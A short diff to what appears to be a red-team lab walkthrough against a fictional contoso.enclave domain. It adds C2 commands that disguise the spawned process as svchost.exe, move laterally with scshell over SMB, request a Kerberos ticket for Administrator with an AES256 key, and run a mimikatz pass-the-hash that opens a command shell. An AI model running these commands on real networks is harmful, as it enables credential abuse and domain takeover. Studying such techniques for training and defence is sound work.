@@ -366,5 +366,18 @@ ls \\enc-jmp-1.contoso.enclave\c$
 ```
 
 ```
+ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+```
+
+```
 jump scshell64 enc-jmp-1.contoso.enclave smb
+```
+
+
+```
+krb_asktgt /user:Administrator /aes256:8121c218316a59fcc5db080b204dbe21750d9cdd47e84df441784bbe1d0db2bc
+```
+
+```
+mimikatz sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:0dde0e62341ba59c5520fab03d0d06bd /run:%COMSPEC%
 ```
